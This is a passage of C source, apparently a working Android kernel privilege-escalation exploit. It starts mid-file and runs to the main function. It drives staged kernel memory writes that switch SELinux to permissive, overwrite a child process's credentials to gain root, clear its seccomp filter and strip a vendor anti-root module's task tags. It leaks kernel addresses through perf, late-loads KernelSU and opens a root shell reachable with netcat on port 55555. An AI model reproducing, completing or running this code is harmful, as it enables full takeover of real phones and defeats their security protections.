  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0)
    return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1)
    return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) != (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1)
    return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning(
        "leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  reserve_standard_io();
  init_cpu_config();
  init_runtime_paths();
  write_root_script();

  if (select_target() < 0)
    return 1;

  apply_iomem_cache();
  log_startup_context();
  init_p0_profile();
#ifdef GHOSTLOCK_TARGET_4_19
  if (!perf_leak_startup()) {
    pr_error("perf KASLR/anchor leak failed; refusing to write blind\n");
    return 1;
  }
#endif
  pin_to_core(CORE);
  pr_info("main thread running on cpu=%d\n", sched_getcpu());

  timer_reset();
  TIMER("exploit start");

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless. */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning(
          "SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    selinux_ok =
        retry_write_stage("W1: SELinux", data_addr(SELINUX_ENFORCING), 1, 15,
                          100000, verify_selinux_stage, NULL, 0);
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      return 1;
    }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already permissive\n");
  }

  /* W2: overwrite the child credential via the task leaked by perf. */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  struct w2_stage_context w2_context = {.pipes = &pipes};
  pid_t child = -1;
  uintptr_t child_task = 0;
  int child_alive = 1;
  int seccomp_ok = 0;
  int ever_rooted = 0;
  pid_t parked_child = -1;
  int parked_cmd_w = -1;

  /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
   * child, so respawn and redo. */
  for (int round = 1; round <= 3; round++) {
    if (round > 1) {
      pr_warning("W3 chain retry %d/3: parking rooted child\n", round);
      if (child > 0 && child_alive) {
        if (pipes.shared) {
          __sync_synchronize();
          pipes.shared->park = 1;
        }
        write(pipes.cmd_w, "P", 1);
        usleep(50000);
        parked_child = child;
        parked_cmd_w = pipes.cmd_w;
      } else {
        close(pipes.cmd_w);
      }
      close(pipes.uid_r);
      child_alive = 1;
      seccomp_ok = 0;
    }

    child = spawn_victim(&pipes, &child_task);
    if (child < 0) {
      pr_warning("fork failed\n");
      return 1;
    }
    w2_context.child = child;
    TIMER("perf_find_task done");

    if (!child_task) {
      /* nothing rooted yet; safe to kill and burn a round */
      pr_warning("perf leak did not reproduce; retrying next round\n");
      kill(-child, SIGKILL);
      waitpid(child, NULL, 0);

      child_alive = 0;
      close(pipes.cmd_w);
      close(pipes.uid_r);
      continue;
    }

    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
#ifdef VR_TAG_A_OFF
    /* ------------------------------------------------------------------
     * vivo vr.ko anti-root per-task bypass (ported from root.c)
     * ------------------------------------------------------------------
     * vr.ko tags every app-origin task at fork/clone time. When the task
     * later holds euid 0, the sys_exit tracepoint probe kills it. We must
     * strip the tag BEFORE W2 verify runs the child's getuid().
     *
     * This exploit primitive is 64-bit granular, so:
     *   – task+0x00 (thread_info.flags) covers tag A at +0x06 and also
     *     clears the VR_SYSCALL_TP_FLAG bit (0x400). This takes the task
     *     off the sys_exit slow-path immediately.
     *   – tag B is at +0x2c. We align down to 8 bytes (0x28) and zero the
     *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
     *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
     * ------------------------------------------------------------------ */
    {
      static int vr_needed = -1;
      if (vr_needed < 0) {
        vr_needed = 1; /* /proc/modules unreadable: assume loaded */
        FILE *m = fopen("/proc/modules", "r");
        if (m) {
          char mod[256];
          vr_needed = 0;
          while (fgets(mod, sizeof(mod), m))
            if (!strncasecmp(mod, "vr", 2) &&
                (mod[2] == ' ' || mod[2] == '_')) {
              vr_needed = 1;
              break;
            }
          fclose(m);
        }
        pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
                                        : "not loaded; skipping tag clear");
      }

      int vr_ok = 1;
      if (vr_needed) {
        /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
        vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
                              "VR: flags+tagA", 1, 1);

        /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
        if (vr_ok) {
          uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
          vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
        }

        if (vr_ok) {
          pr_success("VR.ko per-task tags cleared\n");
        } else {
          pr_warning(
              "VR.ko tag clear failed; child may be killed during W2 verify\n");
        }
      }
    }
#endif

    pselect_child_node = 1;

    int w2_attempts = 1;
    int got_root =
        retry_write_stage("W2: cred", child_task + TASK_CRED_OFF, 2,
                          w2_attempts, 100000, verify_w2_stage, &w2_context, 0);
    if (!got_root) {
      if (pipes.shared) {
        __sync_synchronize();
        pipes.shared->exit = 1;
      }
      write(pipes.cmd_w, "X", 1);
      close(pipes.cmd_w);
      close(pipes.uid_r);
      pr_warning("W2 failed after %d rounds\n", w2_attempts);
      waitpid(child, NULL, WNOHANG);
      return 1;
    }
    ever_rooted = 1;
    /* rooted children never exit; chain failures park (P) */

    /* W3: clear the child's seccomp filter for the independent root shell
     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
     * must be zeroed too; do both writes back-to-back with one probe
     * (real finit_module calls trip vendor root guards).
     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
     * probe to tell [target] from [target+8]. */
    if (!process_has_seccomp()) {
      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
      seccomp_ok = 1;
      break;
    }

    int tcp_writes = tcp_route_selected();
    struct w3_stage_context w3_context = {
        .pipes = &pipes,
        .leaf_to_target8 = 0,
    };
    if (!tcp_writes) {
      /* a failed probe must not pick a side, guessing [target+8] would zero
       * the word before it, inside the task struct */
      if (!retry_write_stage("W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4,
                             50000, verify_leaf_dir_stage, &w3_context, 1)) {
        if (child_alive) {
          if (pipes.shared) {
            __sync_synchronize();
            pipes.shared->exit = 1;
          }
          write(pipes.cmd_w, "X", 1);
          waitpid(child, NULL, WNOHANG);
          /* the next round takes over the pipe fds */
          child_alive = 0;
        }
        pr_warning("W3 leaf direction probe failed; not writing blind\n");
        continue;
      }
    }

    uintptr_t flags_target = w3_context.leaf_to_target8
                                 ? child_task - 8
                                 : child_task + TASK_THREAD_INFO_FLAGS_OFF;
    uintptr_t mode_target = w3_context.leaf_to_target8
                                ? child_task + TASK_SECCOMP_OFF - 8
                                : child_task + TASK_SECCOMP_OFF;

    for (int attempt = 1; attempt <= 6; attempt++) {
      pr_info("W3: TIF_SECCOMP+mode attempt %d/6\n", attempt);
      if (attempt == 1)
        slab_drain();
      int routed = do_one_write(flags_target, "W3: TIF_SECCOMP", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      routed = do_one_write(mode_target, "W3: seccomp mode", 1, 1);
      if (!routed) {
        pr_warning("W3 attempt %d mode route failed; backing off\n", attempt);
        usleep(100000);
        continue;
      }
      usleep(50000);
      int st = 0;
      if (waitpid(child, &st, WNOHANG) == child) {
        pr_warning("W3 lost the child (status=0x%x); chain will retry\n", st);
        child_alive = 0;
        break;
      }
      if (verify_seccomp_probe_stage(&w2_context)) {
        seccomp_ok = 1;
        break;
      }
      usleep(50000);
    }

    if (!seccomp_ok) {
      pr_warning(
          "W3 seccomp clear failed; ksud late-load will likely stay blocked\n");
      continue; /* respawn and redo the chain */
    }
    pr_success(
        "child seccomp fully bypassed (forked workers run filter-free)\n");
    break;
  }

  if (!seccomp_ok)
    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load "
               "will likely stay blocked\n");

  sleep(2);
  TIMER("exploit complete");
  if (!ever_rooted) {
    pr_error("w2 never rooted a child\n");
    return 1;
  }
  if (child_alive) {
    int started = 0;
    if (pipes.shared) {
      __sync_synchronize();
      pipes.shared->go = 1;
      started = 1;
    }
    if (write(pipes.cmd_w, "G", 1) == 1)
      started = 1;
    if (!started)
      pr_warning("failed to start root shell (child exited early)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, WNOHANG);
    if (parked_cmd_w >= 0)
      close(parked_cmd_w);
  } else if (parked_child > 0) {
    if (write(parked_cmd_w, "G", 1) != 1)
      pr_warning("failed to start root shell (parked child exited)\n");
    close(parked_cmd_w);
    waitpid(parked_child, NULL, WNOHANG);
    parked_cmd_w = -1;
  } else {
    pr_warning("skipping late-load: child died during W3\n");
  }
  close(pipes.uid_r);

  int kernelsu_ready = 0;
  for (int i = 0; i < 30 && !(kernelsu_ready = kernelsu_module_loaded()); i++) {
    usleep(100000);
  }
  /* untrusted_app loses /proc/modules once enforcing is restored, so poll
   * the app-readable log for the loaded-module line (up to ~30s). */
  int ksu_log_loaded = 0;
  int ksu_log_failed = 0;
  for (int i = 0; i < 60 && !ksu_log_failed && !ksu_log_loaded; i++) {
    FILE *lf = fopen(g_ksu_log_path, "r");
    if (lf) {
      char line[256];
      while (fgets(line, sizeof(line), lf)) {
        if (strstr(line, "[+] KernelSU module loaded") ||
            strstr(line, "[+] kernelsu already loaded"))
          ksu_log_loaded = 1;
        if (strstr(line, "[!] KernelSU module not loaded"))
          ksu_log_failed = 1;
      }
      fclose(lf);
    }
    if (!ksu_log_failed && !ksu_log_loaded)
      usleep(500000);
  }
  kernelsu_ready = kernelsu_ready || ksu_log_loaded;
  /* enforcing takes the app dir away from the root script, so its log stops
   * before the restore. the state has to be read from here. */
  int enforced = 0;
  for (int i = 0; i < 20 && !(enforced = !check_selinux_off()); i++)
    usleep(500000);
  if (enforced)
    pr_success("enforcing restored\n");
  else
    pr_warning("SELinux left permissive\n");

  /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
   * policy reload keeps it working after enforcing is back. */
  if (kernelsu_ready)
    pr_success("KernelSU ready\n");
  else if (ksu_log_failed)
    pr_warning("KernelSU module load failed\n");
  else if (seccomp_ok)
    pr_warning("temporary root ready; KernelSU module load pending\n");
  else
    pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp "
               "clear failed)\n");
  if (!enforced)
    pr_success("connect with: nc 127.0.0.1 55555\n");
  return 0;
}

int main(int argc, char **argv) { return run_exploit(argc, argv); }
